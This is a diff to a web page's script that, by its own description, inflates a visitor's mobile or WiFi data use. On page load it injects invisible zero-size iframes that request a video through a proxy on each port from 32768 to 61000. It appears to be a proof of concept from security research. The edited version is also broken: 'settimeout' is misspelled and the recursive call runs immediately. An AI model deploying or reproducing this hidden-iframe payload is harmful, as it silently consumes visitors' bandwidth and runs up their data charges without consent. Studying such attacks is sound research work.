@@ -11,11 +11,19 @@ We are inflating your 3G/4G/WiFi data by enumerating ports from 32768 to 61000 t
     var START_PORT = 32768;
     var END_PORT = 61000;
 
-    var port;
-    for (port = START_PORT; port < END_PORT; port++) {
+    function ping(port) {
         var url = HOST + ':' + port + '/https://2459d6dc103cb5933875-c0245c5c937c5dedcca3f1764ecc9b2f.ssl.cf2.rackcdn.com/sec16/xiao.mp4';
         document.getElementById('frame').innerHTML = "<iframe src='" + url +"' style='width:0;height:0;border:0;border:none;'></iframe>";
+        settimeout(ping(++port), 1); 
     }
+
+    ping(START_PORT);
+
+    //var port;
+    //for (port = START_PORT; port <= END_PORT; port++) {
+    //    var url = HOST + ':' + port + '/https://2459d6dc103cb5933875-c0245c5c937c5dedcca3f1764ecc9b2f.ssl.cf2.rackcdn.com/sec16/xiao.mp4';
+    //    document.getElementById('frame').innerHTML = "<iframe src='" + url +"' style='width:0;height:0;border:0;border:none;'></iframe>";
+    //}
 </script>
 </body>
 </html>
